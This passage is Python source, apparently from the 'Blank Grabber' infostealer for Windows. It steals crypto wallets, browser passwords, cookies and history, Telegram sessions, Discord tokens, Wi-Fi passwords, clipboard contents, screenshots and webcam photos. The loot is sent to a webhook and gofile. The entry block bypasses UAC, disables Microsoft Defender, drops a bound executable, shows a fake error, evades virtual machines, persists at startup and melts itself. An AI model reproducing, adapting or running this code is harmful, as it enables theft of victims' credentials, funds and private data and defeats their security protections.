            wallets = (('Zcash', os.path.join(os.getenv('appdata'), 'Zcash')), ('Armory', os.path.join(os.getenv('appdata'), 'Armory')), ('Bytecoin', os.path.join(os.getenv('appdata'), 'Bytecoin')), ('Jaxx', os.path.join(os.getenv('appdata'), 'com.liberty.jaxx', 'IndexedDB', 'file_0.indexeddb.leveldb')), ('Exodus', os.path.join(os.getenv('appdata'), 'Exodus', 'exodus.wallet')), ('Ethereum', os.path.join(os.getenv('appdata'), 'Ethereum', 'keystore')), ('Electrum', os.path.join(os.getenv('appdata'), 'Electrum', 'wallets')), ('AtomicWallet', os.path.join(os.getenv('appdata'), 'atomic', 'Local Storage', 'leveldb')), ('Guarda', os.path.join(os.getenv('appdata'), 'Guarda', 'Local Storage', 'leveldb')), ('Coinomi', os.path.join(os.getenv('localappdata'), 'Coinomi', 'Coinomi', 'wallets')))
            browserPaths = {'Brave': os.path.join(os.getenv('localappdata'), 'BraveSoftware', 'Brave-Browser', 'User Data'), 'Chrome': os.path.join(os.getenv('localappdata'), 'Google', 'Chrome', 'User Data'), 'Chromium': os.path.join(os.getenv('localappdata'), 'Chromium', 'User Data'), 'Comodo': os.path.join(os.getenv('localappdata'), 'Comodo', 'Dragon', 'User Data'), 'Edge': os.path.join(os.getenv('localappdata'), 'Microsoft', 'Edge', 'User Data'), 'EpicPrivacy': os.path.join(os.getenv('localappdata'), 'Epic Privacy Browser', 'User Data'), 'Iridium': os.path.join(os.getenv('localappdata'), 'Iridium', 'User Data'), 'Opera': os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera Stable'), 'Opera GX': os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera GX Stable'), 'Slimjet': os.path.join(os.getenv('localappdata'), 'Slimjet', 'User Data'), 'UR': os.path.join(os.getenv('localappdata'), 'UR Browser', 'User Data'), 'Vivaldi': os.path.join(os.getenv('localappdata'), 'Vivaldi', 'User Data'), 'Yandex': os.path.join(os.getenv('localappdata'), 'Yandex', 'YandexBrowser', 'User Data')}
            for name, path in wallets:
                if os.path.isdir(path):
                    _saveToDir = os.path.join(saveToDir, name)
                    os.makedirs(_saveToDir, exist_ok=True)
                    try:
                        shutil.copytree(path, os.path.join(_saveToDir, os.path.basename(path)), dirs_exist_ok=True)
                        with open(os.path.join(_saveToDir, 'Location.txt'), 'w') as file:
                            file.write(path)
                        self.WalletsCount += 1
                    except Exception:
                        try:
                            shutil.rmtree(_saveToDir)
                        except Exception:
                            pass
            for name, path in browserPaths.items():
                if os.path.isdir(path):
                    for root, dirs, _ in os.walk(path):
                        for _dir in dirs:
                            if _dir == 'Local Extension Settings':
                                localExtensionsSettingsDir = os.path.join(root, _dir)
                                for _dir in ('ejbalbakoplchlghecdalmeeeajnimhm', 'nkbihfbeogaeaoehlefnkodbefgpgknn'):
                                    extentionPath = os.path.join(localExtensionsSettingsDir, _dir)
                                    if os.path.isdir(extentionPath) and os.listdir(extentionPath):
                                        try:
                                            metamask_browser = os.path.join(saveToDir, 'Metamask ({})'.format(name))
                                            _saveToDir = os.path.join(metamask_browser, _dir)
                                            shutil.copytree(extentionPath, _saveToDir, dirs_exist_ok=True)
                                            with open(os.path.join(_saveToDir, 'Location.txt'), 'w') as file:
                                                file.write(extentionPath)
                                            self.WalletsCount += 1
                                        except Exception:
                                            try:
                                                shutil.rmtree(_saveToDir)
                                                if not os.listdir(metamask_browser):
                                                    shutil.rmtree(metamask_browser)
                                            except Exception:
                                                pass

    @Errors.Catch
    def StealSystemInfo(self) -> None:
        if Settings.CaptureSystemInfo:
            saveToDir = os.path.join(self.TempFolder, 'System')
            process = subprocess.run('systeminfo', capture_output=True, shell=True)
            if process.returncode == 0:
                output = process.stdout.decode(errors='ignore').strip().replace('\r\n', '\n')
                os.makedirs(saveToDir, exist_ok=True)
                with open(os.path.join(saveToDir, 'System Info.txt'), 'w') as file:
                    file.write(output)

    @Errors.Catch
    def GetDirectoryTree(self) -> None:
        PIPE = chr(9474) + '   '
        TEE = ''.join((chr(x) for x in (9500, 9472, 9472))) + ' '
        ELBOW = ''.join((chr(x) for x in (9492, 9472, 9472))) + ' '
        if Settings.CaptureSystemInfo:
            output = {}
            for location in ['Desktop', 'Documents', 'Downloads', 'Music', 'Pictures', 'Videos']:
                location = os.path.join(os.getenv('userprofile'), location)
                if not os.path.isdir(location):
                    continue
                dircontent = os.listdir(location)
                if 'desltop.ini' in dircontent:
                    dircontent.remove('desktop.ini')
                if dircontent:
                    process = subprocess.run('tree /A /F', shell=True, capture_output=True, cwd=location)
                    if process.returncode == 0:
                        output[os.path.split(location)[-1]] = (os.path.basename(location) + '\n' + '\n'.join(process.stdout.decode(errors='ignore').splitlines()[3:])).replace('|   ', PIPE).replace('+---', TEE).replace('\\---', ELBOW)
            for key, value in output.items():
                os.makedirs(os.path.join(self.TempFolder, 'Directories'), exist_ok=True)
                with open(os.path.join(self.TempFolder, 'Directories', '{}.txt'.format(key)), 'w', encoding='utf-8') as file:
                    file.write(value)

    @Errors.Catch
    def GetClipboard(self) -> None:
        if Settings.CaptureSystemInfo:
            saveToDir = os.path.join(self.TempFolder, 'System')
            process = subprocess.run('powershell Get-Clipboard', shell=True, capture_output=True)
            if process.returncode == 0:
                content = process.stdout.decode(errors='ignore').strip()
                if content:
                    os.makedirs(saveToDir, exist_ok=True)
                    with open(os.path.join(saveToDir, 'Clipboard.txt'), 'w', encoding='utf-8') as file:
                        file.write(content)

    @Errors.Catch
    def GetAntivirus(self) -> None:
        if Settings.CaptureSystemInfo:
            saveToDir = os.path.join(self.TempFolder, 'System')
            process = subprocess.run('WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName', shell=True, capture_output=True)
            if process.returncode == 0:
                output = process.stdout.decode(errors='ignore').strip().replace('\r\n', '\n').splitlines()
                if len(output) >= 2:
                    output = output[1:]
                    os.makedirs(saveToDir, exist_ok=True)
                    with open(os.path.join(saveToDir, 'Antivirus.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                        file.write('\n'.join(output))

    @Errors.Catch
    def GetTaskList(self) -> None:
        if Settings.CaptureSystemInfo:
            saveToDir = os.path.join(self.TempFolder, 'System')
            process = subprocess.run('tasklist /FO LIST', capture_output=True, shell=True)
            if process.returncode == 0:
                output = process.stdout.decode(errors='ignore').strip().replace('\r\n', '\n')
                os.makedirs(saveToDir, exist_ok=True)
                with open(os.path.join(saveToDir, 'Task List.txt'), 'w', errors='ignore') as tasklist:
                    tasklist.write(output)

    @Errors.Catch
    def GetWifiPasswords(self) -> None:
        if Settings.CaptureWifiPasswords:
            saveToDir = os.path.join(self.TempFolder, 'System')
            passwords = Utility.GetWifiPasswords()
            profiles = list()
            for profile, psw in passwords.items():
                profiles.append(f'Network: {profile}\nPassword: {psw}')
            if profiles:
                os.makedirs(saveToDir, exist_ok=True)
                with open(os.path.join(saveToDir, 'Wifi Networks.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                    file.write(self.Separator.lstrip() + self.Separator.join(profiles))
                self.WifiPasswords.extend(profiles)

    @Errors.Catch
    def TakeScreenshot(self) -> None:
        if Settings.CaptureScreenshot:
            image = ImageGrab.grab(bbox=None, include_layered_windows=False, all_screens=True, xdisplay=None)
            image.save(os.path.join(self.TempFolder, 'Screenshot.png'), 'png')
            self.Screenshot += 1

    @Errors.Catch
    def BlockSites(self) -> None:
        if Settings.BlockAvSites:
            Utility.BlockSites()
            VmProtect.killTasks('chrome', 'firefox', 'msedge', 'safari', 'opera', 'iexplore')

    @Errors.Catch
    def StealBrowserData(self) -> None:
        threads: list[Thread] = []
        paths = {'Brave': os.path.join(os.getenv('localappdata'), 'BraveSoftware', 'Brave-Browser', 'User Data'), 'Chrome': os.path.join(os.getenv('localappdata'), 'Google', 'Chrome', 'User Data'), 'Chromium': os.path.join(os.getenv('localappdata'), 'Chromium', 'User Data'), 'Comodo': os.path.join(os.getenv('localappdata'), 'Comodo', 'Dragon', 'User Data'), 'Edge': os.path.join(os.getenv('localappdata'), 'Microsoft', 'Edge', 'User Data'), 'EpicPrivacy': os.path.join(os.getenv('localappdata'), 'Epic Privacy Browser', 'User Data'), 'Iridium': os.path.join(os.getenv('localappdata'), 'Iridium', 'User Data'), 'Opera': os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera Stable'), 'Opera GX': os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera GX Stable'), 'Slimjet': os.path.join(os.getenv('localappdata'), 'Slimjet', 'User Data'), 'UR': os.path.join(os.getenv('localappdata'), 'UR Browser', 'User Data'), 'Vivaldi': os.path.join(os.getenv('localappdata'), 'Vivaldi', 'User Data'), 'Yandex': os.path.join(os.getenv('localappdata'), 'Yandex', 'YandexBrowser', 'User Data')}
        for name, path in paths.items():
            if os.path.isdir(path):

                def run(name, path):
                    try:
                        browser = Browsers.Chromium(path)
                        saveToDir = os.path.join(self.TempFolder, 'Credentials', name)
                        passwords = browser.GetPasswords() if Settings.CapturePasswords else None
                        cookies = browser.GetCookies() if Settings.CaptureCookies else None
                        history = browser.GetHistory() if Settings.CaptureHistory else None
                        if passwords or cookies or history:
                            os.makedirs(saveToDir, exist_ok=True)
                            if passwords:
                                output = ['URL: {}\nUsername: {}\nPassword: {}'.format(*x) for x in passwords]
                                with open(os.path.join(saveToDir, '{} Passwords.txt'.format(name)), 'w', errors='ignore', encoding='utf-8') as file:
                                    file.write(self.Separator.lstrip() + self.Separator.join(output))
                                self.Passwords.extend(passwords)
                            if cookies:
                                output = ['{}\t{}\t{}\t{}\t{}\t{}\t{}'.format(host, str(expiry != 0).upper(), cpath, str(not host.startswith('.')).upper(), expiry, cname, cookie) for host, cname, cpath, cookie, expiry in cookies]
                                with open(os.path.join(saveToDir, '{} Cookies.txt'.format(name)), 'w', errors='ignore', encoding='utf-8') as file:
                                    file.write('\n'.join(output))
                                self.Cookies.extend([str(x[3]) for x in cookies])
                            if history:
                                output = ['URL: {}\nTitle: {}\nVisits: {}'.format(*x) for x in history]
                                with open(os.path.join(saveToDir, '{} History.txt'.format(name)), 'w', errors='ignore', encoding='utf-8') as file:
                                    file.write(self.Separator.lstrip() + self.Separator.join(output))
                                self.History.extend(history)
                    except Exception as e:
                        return
                t = Thread(target=run, args=(name, path))
                t.start()
                threads.append(t)
        for thread in threads:
            thread.join()
        if Settings.CaptureGames:
            self.StealRobloxCookies()

    @Errors.Catch
    def Webshot(self) -> None:
        isExecutable = Utility.GetSelf()[1]
        if not Settings.CaptureWebcam or not os.path.isfile((Camfile := os.path.join(sys._MEIPASS, 'Camera'))):
            return

        def isMonochrome(path: str):
            return reduce(lambda x, y: x and y < 0.005, ImageStat.Stat(Image.open(path)).var, True)
        with open(Camfile, 'rb') as file:
            data = file.read()
        data = pyaes.AESModeOfOperationCTR(b'f61QfygejoxUWGxI').decrypt(data)
        if not b'This program cannot be run in DOS mode.' in data:
            return
        if isExecutable:
            tempCam = os.path.join(sys._MEIPASS, 'Camera.exe')
        else:
            tempCam = os.path.join(os.getenv('temp'), 'Camera.exe')
        with open(tempCam, 'wb') as file:
            file.write(data)
        tempCamPath = os.path.dirname(tempCam)
        camlist = [x[15:] for x in subprocess.run('Camera.exe /devlist', capture_output=True, shell=True, cwd=tempCamPath).stdout.decode(errors='ignore').splitlines() if 'Device name:' in x]
        for index, name in enumerate(camlist):
            try:
                subprocess.run('Camera.exe /devnum {} /quiet /filename image.bmp'.format(index + 1), shell=True, stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'), cwd=tempCamPath, timeout=5.0)
            except subprocess.TimeoutExpired:
                continue
            if not os.path.isfile((tempImg := os.path.join(tempCamPath, 'image.bmp'))):
                continue
            if isMonochrome(tempImg):
                os.remove(tempImg)
                continue
            os.makedirs((webcamFolder := os.path.join(self.TempFolder, 'Webcam')), exist_ok=True)
            with Image.open(tempImg) as img:
                img.save(os.path.join(webcamFolder, '{}.png'.format(name)), 'png')
            os.remove(tempImg)
            self.WebcamPictures += 1
        os.remove(tempCam)

    @Errors.Catch
    def StealTelegramSessions(self) -> None:
        if Settings.CaptureTelegram:
            telegramPaths = []
            loginPaths = []
            files = []
            dirs = []
            has_key_datas = False
            process = subprocess.run('reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall', shell=True, capture_output=True)
            if process.returncode == 0:
                paths = [x for x in process.stdout.decode(errors='ignore').splitlines() if x.strip()]
                for path in paths:
                    process = subprocess.run('reg query "{}" /v DisplayIcon'.format(path), shell=True, capture_output=True)
                    if process.returncode == 0:
                        path = process.stdout.strip().decode().split(' ' * 4)[-1].split(',')[0]
                        if 'telegram' in path.lower():
                            telegramPaths.append(os.path.dirname(path))
            if not telegramPaths:
                telegramPaths.append(os.path.join(os.getenv('appdata'), 'Telegram Desktop'))
            for path in telegramPaths:
                path = os.path.join(path, 'tdata')
                if os.path.isdir(path):
                    for item in os.listdir(path):
                        itempath = os.path.join(path, item)
                        if item == 'key_datas':
                            has_key_datas = True
                            loginPaths.append(itempath)
                        if os.path.isfile(itempath):
                            files.append(item)
                        else:
                            dirs.append(item)
                    for filename in files:
                        for dirname in dirs:
                            if dirname + 's' == filename:
                                loginPaths.extend([os.path.join(path, x) for x in (filename, dirname)])
            if has_key_datas and len(loginPaths) - 1 > 0:
                saveToDir = os.path.join(self.TempFolder, 'Messenger', 'Telegram')
                os.makedirs(saveToDir, exist_ok=True)
                for path in loginPaths:
                    try:
                        if os.path.isfile(path):
                            shutil.copy(path, os.path.join(saveToDir, os.path.basename(path)))
                        else:
                            shutil.copytree(path, os.path.join(saveToDir, os.path.basename(path)), dirs_exist_ok=True)
                    except Exception:
                        shutil.rmtree(saveToDir)
                        return
                self.TelegramSessions += int((len(loginPaths) - 1) / 2)

    @Errors.Catch
    def StealDiscordTokens(self) -> None:
        if Settings.CaptureDiscordTokens:
            output = list()
            saveToDir = os.path.join(self.TempFolder, 'Messenger', 'Discord')
            accounts = Discord.GetTokens()
            if accounts:
                for item in accounts:
                    USERNAME, USERID, MFA, EMAIL, PHONE, VERIFIED, NITRO, BILLING, TOKEN, GIFTS = item.values()
                    output.append('Username: {}\nUser ID: {}\nMFA enabled: {}\nEmail: {}\nPhone: {}\nVerified: {}\nNitro: {}\nBilling Method(s): {}\n\nToken: {}\n\n{}'.format(USERNAME, USERID, 'Yes' if MFA else 'No', EMAIL, PHONE, 'Yes' if VERIFIED else 'No', NITRO, BILLING, TOKEN, GIFTS).strip())
                os.makedirs(os.path.join(self.TempFolder, 'Messenger', 'Discord'), exist_ok=True)
                with open(os.path.join(saveToDir, 'Discord Tokens.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                    file.write(self.Separator.lstrip() + self.Separator.join(output))
                self.DiscordTokens.extend(accounts)
        if Settings.DiscordInjection and (not Utility.IsInStartup()):
            paths = Discord.InjectJs()
            if paths is not None:
                for dir in paths:
                    appname = os.path.basename(dir)
                    killTask = subprocess.run('taskkill /F /IM {}.exe'.format(appname), shell=True, capture_output=True)
                    if killTask.returncode == 0:
                        for root, _, files in os.walk(dir):
                            for file in files:
                                if file.lower() == appname.lower() + '.exe':
                                    time.sleep(3)
                                    filepath = os.path.dirname(os.path.realpath(os.path.join(root, file)))
                                    UpdateEXE = os.path.join(dir, 'Update.exe')
                                    DiscordEXE = os.path.join(filepath, '{}.exe'.format(appname))
                                    subprocess.Popen([UpdateEXE, '--processStart', DiscordEXE], shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

    def CreateArchive(self) -> tuple[str, str | None]:
        rarPath = os.path.join(sys._MEIPASS, 'rar.exe')
        if Utility.GetSelf()[1] or os.path.isfile(rarPath):
            rarPath = os.path.join(sys._MEIPASS, 'rar.exe')
            if os.path.isfile(rarPath):
                password = Settings.ArchivePassword or 'blank'
                process = subprocess.run('{} a -r -hp{} "{}" *'.format(rarPath, password, self.ArchivePath), capture_output=True, shell=True, cwd=self.TempFolder)
                if process.returncode == 0:
                    return 'rar'
        shutil.make_archive(self.ArchivePath.rsplit('.', 1)[0], 'zip', self.TempFolder)
        return 'zip'

    def GenerateTree(self) -> None:
        if os.path.isdir(self.TempFolder):
            try:
                contents = '\n'.join(Utility.Tree((self.TempFolder, 'Stolen Data')))
                with open(os.path.join(self.TempFolder, 'Tree.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                    file.write(contents)
            except Exception:
                pass

    def UploadToGofile(self, path, filename=None) -> str | None:
        if os.path.isfile(path):
            with open(path, 'rb') as file:
                fileBytes = file.read()
            if filename is None:
                filename = os.path.basename(path)
            http = PoolManager()
            try:
                server = json.loads(http.request('GET', 'https://api.gofile.io/getServer').data.decode())['data']['server']
                if server:
                    url = json.loads(http.request('POST', 'https://{}.gofile.io/uploadFile'.format(server), fields={'file': (filename, fileBytes)}).data.decode())['data']['downloadPage']
                    if url:
                        return url
            except Exception:
                pass

    def SendData(self) -> None:
        extention = self.CreateArchive()
        if (self.Cookies or self.Passwords or self.EpicCount or self.TelegramSessions or self.SteamCount or self.WalletsCount or self.RobloxCookies or self.DiscordTokens or self.MinecraftSessions) and os.path.isfile(self.ArchivePath):
            computerName = os.getenv('computername')
            computerOS = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()[2].strip()
            totalMemory = str(int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()[1]) / 1000000000)) + ' GB'
            uuid = subprocess.run('wmic csproduct get uuid', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()[1]
            cpu = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER", capture_output=True, shell=True).stdout.decode(errors='ignore').strip()
            gpu = subprocess.run('wmic path win32_VideoController get name', capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
            productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output=True, shell=True).stdout.decode(errors='ignore').strip()
            http = PoolManager()
            try:
                r: dict = json.loads(http.request('GET', 'http://ip-api.com/json/?fields=225545').data.decode())
                if r.get('status') != 'success':
                    raise Exception('Failed')
                data = f"\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {(chr(9989) if r['mobile'] else chr(10062))}\n{'Proxy/VPN:'.ljust(20)} {(chr(9989) if r['proxy'] else chr(10062))}"
                if len(r['reverse']) != 0:
                    data += f"\nReverse DNS: {r['reverse']}"
            except Exception:
                ipinfo = '(Unable to get IP info)'
            else:
                ipinfo = data
            collection = {'Discord Accounts': len(self.DiscordTokens), 'Passwords': len(self.Passwords), 'Cookies': len(self.Cookies), 'History': len(self.History), 'Roblox Cookies': len(self.RobloxCookies), 'Telegram Sessions': self.TelegramSessions, 'Wallets': self.WalletsCount, 'Wifi Passwords': len(self.WifiPasswords), 'Minecraft Sessions': self.MinecraftSessions, 'Epic Sessions': self.EpicCount, 'Steam Sessions': self.SteamCount, 'Screenshot': self.Screenshot, 'Webcam': self.WebcamPictures}
            grabbedInfo = '\n'.join([key.ljust(20) + ' : ' + str(value) for key, value in collection.items()])
            image_url = 'https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png'
            payload = {'content': '||@everyone||' if Settings.PingMe else '', 'embeds': [{'title': 'Blank Grabber', 'description': f'**__System Info__\n```autohotkey\nComputer Name: {computerName}\nComputer OS: {computerOS}\nTotal Memory: {totalMemory}\nUUID: {uuid}\nCPU: {cpu}\nGPU: {gpu}\nProduct Key: {productKey}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**', 'url': 'https://github.com/Blank-c/Blank-Grabber', 'color': 34303, 'footer': {'text': 'Grabbed by Blank Grabber | https://github.com/Blank-c/Blank-Grabber'}, 'thumbnail': {'url': image_url}}], 'username': 'Blank Grabber', 'avatar_url': image_url}
            filename = 'Blank-{}.{}'.format(os.getlogin(), extention)
            if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 20:
                url = self.UploadToGofile(self.ArchivePath, filename)
            else:
                url = None
            fields = dict()
            if not url:
                with open(self.ArchivePath, 'rb') as file:
                    fileBytes = file.read()
                fields['file'] = (filename, fileBytes)
            else:
                payload['content'] += ' | Archive : {}'.format(url)
            fields['payload_json'] = json.dumps(payload).encode()
            http.request('POST', Settings.Webhook, fields=fields)
if __name__ == '__main__' and os.name == 'nt':
    if Utility.GetSelf()[1] and (not Utility.IsAdmin()) and (not '--nouacbypass' in sys.argv):
        Utility.UACbypass()
    if Utility.GetSelf()[1]:
        Utility.ExcludeFromDefender()
    Utility.DisableDefender()
    if Utility.GetSelf()[1] and (not Utility.IsInStartup()) and os.path.isfile(os.path.join(sys._MEIPASS, 'bound.exe')):
        try:
            if os.path.isfile((boundfile := os.path.join(os.getenv('temp'), 'bound.exe'))):
                os.remove(boundfile)
            shutil.copy(os.path.join(sys._MEIPASS, 'bound.exe'), boundfile)
            Utility.ExcludeFromDefender(boundfile)
            subprocess.Popen('start bound.exe', shell=True, cwd=os.path.dirname(boundfile), creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
        except Exception:
            pass
    if Utility.GetSelf()[1] and Settings.FakeError[0] and (not Utility.IsInStartup()):
        try:
            title = Settings.FakeError[1][0].replace('"', '\\x22').replace("'", '\\x22')
            message = Settings.FakeError[1][1].replace('"', '\\x22').replace("'", '\\x22')
            icon = int(Settings.FakeError[1][2])
            cmd = 'mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'{}\', 0, \'{}\', {}+16);close()"'.format(message, title, Settings.FakeError[1][2])
            subprocess.Popen(cmd, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
        except Exception:
            pass
    if not Settings.Vmprotect or not VmProtect.isVM():
        if Utility.GetSelf()[1]:
            if Settings.Melt and (not Utility.IsInStartup()):
                Utility.HideSelf()
        elif Settings.Melt:
            Utility.DeleteSelf()
        try:
            if Utility.GetSelf()[1] and Settings.Startup and (not Utility.IsInStartup()):
                path = Utility.PutInStartup()
                if path is not None:
                    Utility.ExcludeFromDefender(path)
        except Exception:
            pass
        while True:
            try:
                if Utility.IsConnectedToInternet():
                    BlankGrabber()
                    break
                else:
                    time.sleep(10)
            except Exception as e:
                print('Main Error: ' + str(e))
                time.sleep(600)
        if Utility.GetSelf()[1] and Settings.Melt and (not Utility.IsInStartup()):
            Utility.DeleteSelf()